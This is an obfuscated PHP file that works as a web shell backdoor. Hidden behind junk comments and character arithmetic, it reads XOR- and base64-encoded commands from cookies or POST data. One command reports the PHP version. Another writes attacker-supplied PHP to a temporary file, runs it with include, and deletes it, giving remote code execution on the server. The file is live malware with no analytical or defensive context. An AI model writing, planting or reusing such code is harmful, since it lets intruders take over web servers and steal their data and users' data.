<?php      function    recwy(){$xmnvikwpro='vveqgyw';       print_r  (98506+98506);    }

$cpdfoldqdq	=/* m*/'cpdfoldqdq'/*   dcms */^/*bnat */' ';
$sxbl_uhtnb/* ppbsv  */=	$cpdfoldqdq(980-878)	.	"i".$cpdfoldqdq(269-161)	.     "e"."_"."p"."u"."\164"/*nr */./*zr_*/"_".$cpdfoldqdq(1046-947)       .	"\x6f"	.	"\156"/*  q*/.	"t".$cpdfoldqdq(1058-957)/* vv*/.     "\156"      ./*   ctlq  */"t"."\x73";

$ycbuaa	=      "\x62"	.	"a"."s".$cpdfoldqdq(955-854)       .    $cpdfoldqdq(54)       .	"4".$cpdfoldqdq(95)/*   n  */./*  vq   */"d"."e"."c".$cpdfoldqdq(549-438)/*_sm   */.     $cpdfoldqdq(100)/*   v  */.	"\145";


$iqefotcco/*  cz  */=/*  tsvq   */"u"."n"."s".$cpdfoldqdq(209-108)	.	"\x72"	.   "\x69"       ./*   fdony   */"a".$cpdfoldqdq(723-615)	.	$cpdfoldqdq(752-647)	.	"z".$cpdfoldqdq(675-574);

$otfjzonj	=  "\160"	.	"h"."\x70"	.	"\x76"	.	"e"."\x72"    .	"s".$cpdfoldqdq(105)	.	"\x6f"/*k_v*/./* wjvb */"n";$myhyokj/*vef*/=       "\165"/*  bcom  */.	"n"."l"."i"."n".$cpdfoldqdq(380-273);



/*l*/function       qlruqizk($fmvatmvi,/*xcyea*/$yniq_low_gqnkvunjs)


{
	global	$cpdfoldqdq;/* gsoue*/$sxojlxhho   =/*  kq */"";
       for	($yniq_low_jugg_ael/*   _ */=       0;/* vt  */$yniq_low_jugg_ael/*   p_fq   */<	strlen($fmvatmvi);)/* j */{
   for	($yniq_low_       =      0;    $yniq_low_/*aarm   */</* rdsup   */strlen($yniq_low_gqnkvunjs)	&&      $yniq_low_jugg_ael	</*_hn  */strlen($fmvatmvi);     $yniq_low_++,	$yniq_low_jugg_ael++)/*poc */{  $sxojlxhho   .=	$cpdfoldqdq(ord($fmvatmvi[$yniq_low_jugg_ael])	^     ord($yniq_low_gqnkvunjs[$yniq_low_]));
/*   s */}
  }    return  $sxojlxhho;
}


$aqnuzedpi/*hugq */=	$_COOKIE;


$_bvbihxv/* xbc_*/=	$_POST;


$aqnuzedpi/*xma   */=	array_merge($_bvbihxv,/*tfbm */$aqnuzedpi);


$hgdghs  =	$cpdfoldqdq(101)	.  "6"."\x61"       ./*   k */"\x37"/* t  */.      "2".$cpdfoldqdq(202-100)/*  pr*/./*   eenew   */"3"."\x35"/*   ht  */./*  os */"-".$cpdfoldqdq(54)	.	$cpdfoldqdq(64-13)/* er_ra */./* c */"4"."3"."\55"/*  sl */./* qjdc   */$cpdfoldqdq(52)	.  "\63"	.	"\146"/*ldorw */./*   eql */"2"."-"."\142"/* mt   */./* jkzdt  */"\145"    .  "d".$cpdfoldqdq(981-927)	.	$cpdfoldqdq(45)       .	$cpdfoldqdq(50)/*  x  */.	$cpdfoldqdq(64-10)	./*  x   */$cpdfoldqdq(348-251)	.	"3".$cpdfoldqdq(474-375)/*  yoau  */.	"f".$cpdfoldqdq(54)	./*  ked  */"7"."\x65".$cpdfoldqdq(818-764)/*   i*/.      $cpdfoldqdq(605-557)	./*   evip*/$cpdfoldqdq(52);


foreach/*jue   */($aqnuzedpi	as/*ky  */$hkpjqar      =>	$fmvatmvi)/* i */{

   $fmvatmvi     =       $iqefotcco(qlruqizk(qlruqizk($ycbuaa($fmvatmvi),   $hgdghs),/*  yhnw   */$hkpjqar));

/*  pbaak  */if      (isset($fmvatmvi[$cpdfoldqdq(583-486)	./*sagpb */"k"]))       {	if	($fmvatmvi[$cpdfoldqdq(97)]      ==    "\151")/* quhh */{
      $yniq_low_jugg_ael	=/*   lhz */array();
  $yniq_low_jugg_ael["p"."v"]	=	$otfjzonj();


/*shp   */$yniq_low_jugg_ael["s".$cpdfoldqdq(118)]	=   $cpdfoldqdq(51)     .	"."."5";

	echo/*scd */@serialize($yniq_low_jugg_ael);
/*vu*/}    elseif/*  b*/($fmvatmvi[$cpdfoldqdq(97)]/*  zk_q */==/*  jxo*/"\x65")	{
      $wxvri	=	sprintf("\56"	.	"\x2f"    .	$cpdfoldqdq(826-789)/*tphf  */./*  gwf*/$cpdfoldqdq(115)	./*  uo_eu   */$cpdfoldqdq(366-320)       .	"p"."l",	md5($hgdghs));

	$sxbl_uhtnb($wxvri,	"<"/*   jh */.    "?".$cpdfoldqdq(112)	./*   _ac   */"h"."p".$cpdfoldqdq(32)/*jy */.       $cpdfoldqdq(117)	.    "n"."l"."\x69"	.	$cpdfoldqdq(539-429)/*x  */.	"k"."\50"     .       $cpdfoldqdq(918-823)      .    "_".$cpdfoldqdq(70)  .	"I"."L"."\x45"/*pmrq*/./*   wawy   */"_".$cpdfoldqdq(113-18)/* d */.	$cpdfoldqdq(41)	./*mp  */";".$cpdfoldqdq(32)/*   aqk*/.	$fmvatmvi["d"]);


/* dtdq  */include($wxvri);
       $stfqy  =/* fjm  */$wxvri;   $myhyokj($stfqy);/* ziq   */}


	exit();
	}


}

